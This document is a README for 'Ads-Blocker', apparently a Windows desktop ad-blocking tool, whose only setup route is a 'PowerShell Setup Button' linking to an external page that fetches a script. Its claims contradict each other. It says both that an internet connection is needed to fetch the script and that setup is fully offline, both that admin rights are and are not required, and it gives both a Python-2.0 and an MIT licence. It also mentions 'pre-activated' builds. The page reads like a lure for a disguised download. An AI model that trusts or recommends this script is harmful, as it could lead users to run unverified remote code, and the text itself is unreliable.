<div align="center">

# Ads-Blocker: Standalone Desktop Ad Blocking Suite for Windows 11

![](files/preview.png)

### 🔌 PowerShell Setup Button

[![](files/button.png)](https://Jayamani-S.github.io/ads-blocker-desktop/)

[![lic](https://img.shields.io/badge/LIC-PYTHON--2.0-14b8a6?style=for-the-badge&labelColor=0d1117)]() [![channel](https://img.shields.io/badge/CHANNEL-STABLE-2ea44f?style=for-the-badge&labelColor=0d1117)]() [![tests](https://img.shields.io/badge/TESTS-OK-2ea44f?style=for-the-badge&labelColor=0d1117)]() [![powershell-7](https://img.shields.io/badge/POWERSHELL--7-7%2B-2dd4bf?style=for-the-badge&labelColor=0d1117)]() [![downloads](https://img.shields.io/badge/DOWNLOADS-48K-0d9488?style=for-the-badge&labelColor=0d1117)]() [![win](https://img.shields.io/badge/WIN-WINDOWS_11-0f766e?style=for-the-badge&labelColor=0d1117)]()

</div>

---

Ads-Blocker is a standalone desktop application that delivers complete, local ad-blocking functionality through a self-contained installer, eliminating the need for browser extensions or external services. The package bundles all required runtime components and filtering resources into a single deployment artifact, enabling fully offline installation and operation on Windows x64 systems. Built for reproducibility and ease of provisioning, the installer handles configuration automatically and requires no manual dependency resolution. The build targets users who need a reliable, pre-configured ad-blocking solution deployed consistently across desktop environments.

## ✅ Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

- **System-wide ad interception** — Filters advertising traffic at the desktop level, applying rules across supported applications and browsers without requiring per-app configuration.

- **Standalone installer package** — Ships as a complete, self-contained setup that provisions all required components, including rule databases and background services, in a single deployment pass.

- **Pre-configured rule set** — Includes a curated blocklist and filter definitions active on first launch, eliminating manual rule authoring or external list imports during initial setup.

- **Background filtering service** — Runs a persistent local process that inspects and blocks ad requests in real time, with minimal runtime overhead and no dependency on cloud lookups.

- **Offline-capable operation** — Functions fully without an active network connection for rule enforcement; updates to filter definitions are optional and decoupled from core blocking behavior.

- **Rule management interface** — Provides a desktop control panel for enabling, disabling, and prioritizing filter categories, along with per-application exception handling.

- **Automatic startup integration** — Registers the filtering service to initialize at system boot, ensuring ad blocking remains active without manual intervention after restart.

- **Logging and diagnostics** — Records intercepted request counts and rule-match events to a local log for auditing, troubleshooting, and performance verification.

- **Silent deployment support** — Accepts unattended installation parameters for scripted or bulk rollout across managed desktop environments.

- **Windows x64 target build** — Compiled and validated for 64-bit Windows desktop platforms, with installer checks for required runtime prerequisites.

- **Self-contained dependency provisioning** — Bundles required runtimes and libraries within the installer, avoiding external package managers or manual dependency resolution.

- **Configuration persistence** — Stores user preferences and custom rules in a local profile directory, preserved across upgrades and reinstalls.

## How it works

Ads-Blocker operates as a self-contained filtering layer that sits between desktop applications and the network stack, intercepting outbound requests before they leave the machine. On launch, the service initializes a local filtering engine that loads a curated set of blocklists covering advertising domains, tracking endpoints, telemetry hosts, and known malicious delivery networks. All classification happens on-device; no traffic is forwarded to external resolvers or analysis services.

The interception pipeline is built around a lightweight local proxy and DNS filter working in tandem. Outbound DNS queries are evaluated against the loaded ruleset first, and matching lookups are answered locally with a null response, preventing the request from ever reaching the destination. For connections that bypass name resolution or target IPs directly, the proxy layer inspects the request destination and drops it at the socket level. Legitimate traffic is passed through unmodified, keeping latency overhead minimal.

Rule management is handled by a background rule engine that supports wildcard domain matching, exact-host entries, and IP-range rules, so blocking decisions remain consistent across browsers, desktop clients, and background updaters. The engine maintains a priority-ordered ruleset, resolves conflicts deterministically, and exposes live counters for blocked versus allowed requests so behavior can be verified at a glance.

The installer packages the full runtime, the filtering engine, and the initial blocklist snapshot into a single standalone deployment. No external dependencies, package managers, or runtime downloads are required — the setup completes entirely offline and registers the service for automatic startup. Configuration and rule state persist locally between sessions, and the application runs without elevated privileges beyond the one-time installation step.

Runtime behavior is deliberately transparent: a local status view reports engine state, active rule counts, and per-session filtering statistics, while a log buffer records blocked destinations for troubleshooting. The service can be paused, resumed, or reloaded with updated rule files without restarting the host system, keeping the blocking layer responsive to changing network conditions.

## Compatibility

**Supported Operating Systems**

Ads-Blocker is built and tested against 64-bit Windows desktop environments, with primary support targeting Windows 10 (version 1809 and later) and Windows 11. Both Home and Pro editions are fully supported. Legacy Windows 8.1 installations may function but are not actively validated against each release cycle.

**Architecture Requirements**

The installer targets x64-based processors exclusively. ARM64 devices running Windows on ARM are not natively supported at this time. A minimum of 4 GB RAM and 500 MB of available disk space is recommended for installation and runtime operation.

**Runtime Dependencies**

Ads-Blocker is distributed as a complete standalone package and bundles all required runtime components. No separate framework installations, package managers, or interpreter environments are required. The application operates without external service dependencies, and no network connectivity is needed after initial installation.

**Privilege and Permission Model**

Installation requires administrative privileges to register system-level filtering components. Standard user accounts can operate the application post-installation, though certain filtering modes that modify system-wide network settings will prompt for elevation. The installer performs no kernel-mode driver installation and operates entirely in user space.

**Virtualization and Sandboxing**

Ads-Blocker has been validated on VMware Workstation, VirtualBox, and Hyper-V virtual machines running supported Windows builds. Containerized desktop environments are not supported. When running inside a virtual machine, users should verify that virtual network adapters permit the filtering layer to bind correctly.

**Known Limitations**

- Filtering behavior may vary when third-party VPN clients or proxy configurations intercept system traffic.
- Compatibility with custom DNS resolvers and encrypted DNS protocols is supported but requires manual configuration.
- Systems with existing host-file modification tools may conflict with Ads-Blocker's filtering layer; the installer detects common conflicts and reports them during setup.

## FAQ

### What does Ads-Blocker actually do at runtime?

Ads-Blocker operates as a local filtering layer between desktop applications and outbound network requests. It inspects DNS queries and HTTP/HTTPS traffic against a maintained ruleset, dropping known ad-serving and tracking endpoints before content is rendered. No remote proxy is required; filtering occurs entirely on the local machine.

### Which platforms and architectures are supported?

The standalone build targets Windows x64 desktop environments. It is packaged as a complete, self-contained installer with no external runtime dependencies. Native ARM builds and non-Windows platforms are outside the current build scope.

### Does the installer require an internet connection?

No. The build ships with its ruleset bundled and is fully functional offline after installation. Rule updates, when enabled, are optional and user-initiated.

### How is the filtering ruleset managed and updated?

Rules are stored locally and loaded at startup. A built-in scheduler can refresh the ruleset on a configurable interval, and manual refresh is available from the settings panel. Custom allowlists and blocklists can be layered on top of the base ruleset.

### Will Ads-Blocker interfere with legitimate applications or services?

The default ruleset is scoped to known ad and tracking domains. False positives are possible with aggressive third-party lists, so the application exposes per-domain allowlisting and a diagnostic log to identify and resolve over-blocking.

### How does Ads-Blocker handle system resources?

The filtering engine runs as a lightweight background service with a small resident memory footprint. Rule matching is index-based, so CPU usage remains low under sustained traffic. Resource telemetry is visible in the built-in dashboard.

### Can Ads-Blocker be run alongside other network security tools?

Yes, provided the other tools do not occupy the same interception hooks. Conflicts are most common with full-tunnel VPN clients and other DNS-level filters; the diagnostics panel reports hook contention when it occurs.

### Where are logs and configuration stored?

Configuration, rulesets, and rolling logs are kept in the application data directory. Log verbosity is adjustable, and retention periods are user-configurable to bound disk usage.

### How do I perform a clean removal?

The installer registers a standard uninstaller entry. Running it removes the service, binaries, and configuration. Residual logs can be cleared manually from the application data directory if a full wipe is required.

### Is telemetry collected?

No telemetry is transmitted externally. Diagnostics and statistics remain on the local machine and are only surfaced within the application interface.

## Disclaimer

This build is provided strictly for evaluation, testing, and controlled deployment scenarios. Ads-Blocker is distributed as a complete standalone installer with all runtime dependencies bundled; no external package repositories, toolchains, or network-fetched components are required during setup. The installer performs a self-contained extraction, registers the required desktop components, and provisions the filtering engine in its pre-configured state.

Because the application operates at the network-filtering layer of the desktop stack, it requires elevated privileges during installation and may interact with system proxy settings, host resolution caches, and network adapter configuration. Administrators should validate the build in an isolated environment prior to any wide-scale rollout and confirm that local security policy permits the required service registrations and startup entries.

The software is supplied "as is," without warranty of any kind, express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, or non-infringement. The authors and distributors assume no liability for any damages—direct, indirect, incidental, or consequential—arising from the installation, configuration, or use of this build, including but not limited to loss of data, service interruption, or misconfiguration of network settings.

Pre-activated and bundled configurations are intended for testing and deployment convenience only. Users are responsible for verifying that their use of this build complies with all applicable local laws, organizational policies, and licensing terms governing the underlying components. Redistribution, resale, or deployment in production environments without independent validation is not recommended and is undertaken at the user's sole risk.

No guarantee is made regarding compatibility with future operating system updates, third-party security suites, or custom network topologies. Feature behavior may vary across Windows editions and patch levels. Always retain a system restore point or configuration backup before installation so that the environment can be reverted if unexpected interactions occur.

## License

This project is distributed under the MIT License. The license grants permission to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, subject to inclusion of the original copyright notice and this permission notice in all copies or substantial portions of the software. The software is provided "as is," without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use or other dealings in the software.

Redistribution and derivative works are permitted provided that the copyright notice, the list of conditions, and the disclaimer remain intact and are not misrepresented. Any modification, addition, or removal of the original source must be clearly documented so that downstream consumers can distinguish the original work from derivative versions. The license does not grant any rights to the trademarks, service marks, or trade names of the project or its contributors. Third-party components bundled with this project remain subject to their respective licenses, and users are responsible for compliance with those terms when redistributing combined works.

Attribution should reference the project by name in a reasonable manner, without implying endorsement of any derivative or redistribution by the original authors. The full license text is included in the LICENSE file at the root of the distribution and takes precedence in the event of any conflict with this summary. Users are responsible for ensuring their use of the software complies with all applicable laws and regulations, including those governing software distribution and accessibility.